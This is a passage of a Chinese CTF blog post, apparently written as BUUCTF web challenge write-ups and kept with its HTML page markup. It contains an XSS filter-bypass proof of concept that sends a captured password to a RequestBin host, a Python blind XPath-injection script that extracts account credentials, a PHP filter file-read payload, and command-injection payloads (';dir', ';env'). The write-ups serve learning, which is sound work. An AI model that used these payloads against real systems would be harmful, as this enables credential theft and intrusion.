class="hljs-string">&#x27;user&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;psw&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span>)&#123;<br>		<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;username&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;user&#x27;</span>];<br>		<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;password&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;psw&#x27;</span>];<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看出，用户名和密码都填入了表单<br>登录成功后有一个<code>feedback.php</code>的用户反馈<br><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410242208874.png" srcset="/img/loading.gif" lazyload alt="image-20241024220859718"></p>
<p>在这个页面的源码中存在注释</p>
<pre><code class="hljs">        if(is_array($feedback))&#123;
            echo &quot;&lt;script&gt;alert(&#39;反馈不合法&#39;);&lt;/script&gt;&quot;;
            return false;
        &#125;
        $blacklist = [&#39;_&#39;,&#39;\&#39;&#39;,&#39;&amp;&#39;,&#39;\\&#39;,&#39;#&#39;,&#39;%&#39;,&#39;input&#39;,&#39;script&#39;,&#39;iframe&#39;,&#39;host&#39;,&#39;onload&#39;,&#39;onerror&#39;,&#39;srcdoc&#39;,&#39;location&#39;,&#39;svg&#39;,&#39;form&#39;,&#39;img&#39;,&#39;src&#39;,&#39;getElement&#39;,&#39;document&#39;,&#39;cookie&#39;];
        foreach ($blacklist as $val) &#123;
            while(true)&#123;
                if(stripos($feedback,$val) !== false)&#123;
                    $feedback = str_ireplace($val,&quot;&quot;,$feedback);
                &#125;else&#123;
                    break;
                &#125;
            &#125;
        &#125;
</code></pre>
<p>RequestBin提供了一个URL，该URL将收集对其发出的请求</p>
<p>poc</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">incookieput</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">incookieput</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scrcookieipt</span> <span class="hljs-attr">scookierc</span>=<span class="hljs-string">&quot;./js/login.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">scrcookieipt</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scrcookieipt</span>&gt;</span><br>    var psw = docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;<br>    docucookiement.locacookietion=&quot;http://http.requestbin.buuoj.cn/1e8jfct1/?a=&quot;+psw;<br><span class="hljs-tag">&lt;/<span class="hljs-name">scrcookieipt</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410242210671.png" srcset="/img/loading.gif" lazyload alt="image-20241024221023578"></p>
<h2 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020]ezlogin"></a>[NPUCTF2020]ezlogin</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7791">xpath注入</a>这篇文章有关于xpath很详细的解答，包括原理等，详细了解请见此篇.</p>
<p>打开网页，登陆框</p>
<p><img src="https://img2020.cnblogs.com/blog/1960851/202008/1960851-20200805135615946-1047568535.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>s = requests.session()<br>url =<span class="hljs-string">&#x27;http://47e7790f-8a53-4efa-988b-7a350ebb91d5.node3.buuoj.cn//login.php&#x27;</span><br><br><br><br>head =&#123;<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;</span>,<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/xml&quot;</span><br>&#125;<br>find =re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;input type=&quot;hidden&quot; id=&quot;token&quot; value=&quot;(.*?)&quot; /&gt;&#x27;</span>)<br><br>strs =<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span><br><br><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> strs:<br><br>        r = s.post(url=url)<br>        token = find.findall(r.text)<br>        <span class="hljs-comment">#猜测根节点名称</span><br>        payload_1 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br>        <span class="hljs-comment">#猜测子节点名称</span><br>        payload_2 = <span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#猜测accounts的节点</span><br>        payload_3 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#猜测user节点</span><br>        payload_4 =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(name(/root/accounts/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-comment">#跑用户名和密码</span><br>        payload_username =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/username/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br>        payload_password =<span class="hljs-string">&quot;&lt;username&gt;&#x27;or substring(/root/accounts/user[2]/password/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;&lt;/username&gt;&lt;password&gt;3123&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;&quot;</span>.<span class="hljs-built_in">format</span>(i,j,token[<span class="hljs-number">0</span>])<br><br><br>        <span class="hljs-built_in">print</span>(payload_password)<br>        r = s.post(url=url,headers=head,data=payload_username)<br>        <span class="hljs-built_in">print</span>(r.text)<br><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;非法操作&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag+=j<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;用户名或密码错误!&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">accounts</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>gtfly123<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>e10adc3949ba59abbe56e057f20f883e<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>adm1n<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>cf7414b5bdb2e65ee43083f4ddbc4d9f<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">accounts</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>登录获得信息，用伪协议进行文件读取</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=pHp:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.BAse64-encode/</span>resource=/flag<br></code></pre></td></tr></table></figure>

<h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>下载Hei_Mao_Jing_Chang.mp3文件,使用命令strings Hei_Mao_Jing_Chang.mp3查看文件<br>在文末看到一段PHP代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;</span><br><span class="hljs-string">$clandestine = getenv(&quot;clandestine&quot;);</span><br><span class="hljs-string">if(isset($_POST[&#x27;</span>White-cat-monitor<span class="hljs-string">&#x27;]))</span><br><span class="hljs-string">    $clandestine = hash_hmac(&#x27;</span>sha256<span class="hljs-string">&#x27;, $_POST[&#x27;</span>White-cat-monitor<span class="hljs-string">&#x27;], $clandestine);</span><br><span class="hljs-string">$hh = hash_hmac(&#x27;</span>sha256<span class="hljs-string">&#x27;, $_POST[&#x27;</span>One-ear<span class="hljs-string">&#x27;], $clandestine);</span><br><span class="hljs-string">if($hh !== $_POST[&#x27;</span>Black-Cat-Sheriff<span class="hljs-string">&#x27;])&#123;</span><br><span class="hljs-string">    die(&#x27;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p> hash_hmac($algo, $data, $key)：</p>
<p>当传入的<code>$data</code>为数组时，加密得到的结果固定为<code>NULL</code>；</p>
<p>让White-cat-monitor的值是一个数组，这样使得clandestine的值为null，</p>
<p>那么第四行可以看成：$hh &#x3D; hash_hmac(‘sha256’, $_POST[‘One-ear’], null);</p>
<p>要知道hh的值，我们得知道One-ear的值：由于exec只返回命令执行结果的最后一行内容，我们可以使用；来执行多条命令，然后使用dir来显示文件夹内容，所以 One-ear&#x3D;;dir </p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">White-cat-monitor[]<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp; Black-Cat-Sheriff<span class="hljs-operator">=</span><span class="hljs-number">83</span>a<span class="hljs-number">52</span>f<span class="hljs-number">8</span>ff<span class="hljs-number">4e399417109312</span>e<span class="hljs-number">0539</span><span class="hljs-keyword">c</span><span class="hljs-number">80147</span>b<span class="hljs-number">5514586</span><span class="hljs-keyword">c</span><span class="hljs-number">45</span>a<span class="hljs-number">6</span>caeb<span class="hljs-number">3681</span>ad<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>a<span class="hljs-number">395</span>&amp; One-ear<span class="hljs-operator">=</span><span class="hljs-comment">;dir</span><br></code></pre></td></tr></table></figure>

<p>“tac f*|grep {” 。它的作用是逆向输出当前目录下以f开头的所有文件的内容，并从内容中查找包含“{”字符的行。“|”表示管道符号，将前一个命令的输出作为参数传递给下一个命令。</p>
<p>payload:</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Black-Cat-Sheriff<span class="hljs-operator">=</span><span class="hljs-number">269</span>afa<span class="hljs-number">1</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>d<span class="hljs-number">77e37919</span><span class="hljs-keyword">c</span><span class="hljs-number">94</span>f<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">75</span>a<span class="hljs-number">028819193</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>b<span class="hljs-number">51</span>aee<span class="hljs-number">2</span>d<span class="hljs-number">46222</span>cda<span class="hljs-number">81</span>fe<span class="hljs-number">154538</span>&amp;One-ear<span class="hljs-operator">=</span><span class="hljs-comment">;tac f*|grep \&#123;&amp;White-cat-monitor[]=1</span><br></code></pre></td></tr></table></figure>

<p>或者直接查看环境变量</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">White-<span class="hljs-keyword">cat</span>-monitor[]=0&amp;Black-<span class="hljs-keyword">Cat</span>-Sheriff=afd556602cf62addfe4132a81b2d62b9db1b6719f83e16cce13f51960f56791b&amp;<span class="hljs-keyword">One</span>-ear=;env<br></code></pre></td></tr></table></figure>


                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E5%88%B7%E9%A2%98/" class="category-chain-item">刷题</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/buuctf/">#buuctf</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>buuctf</div>
      <div>http://example.com/2023/08/06/刷题/buuctf(web)/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Englobe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年8月6日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/09/17/%E6%AF%94%E8%B5%9B/Moectf/" title="Moectf">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Moectf</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/06/04/%E5%88%B7%E9%A2%98/ctfshow%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="ctfshow反序列化">
                        <span class="hidden-mobile">ctfshow反序列化</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"C0XNH4OuYG6qFSyM2x9ey0gQ-gzGzoHsz","appKey":"oebfztnfcNOaIyD7KaemaR6U","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
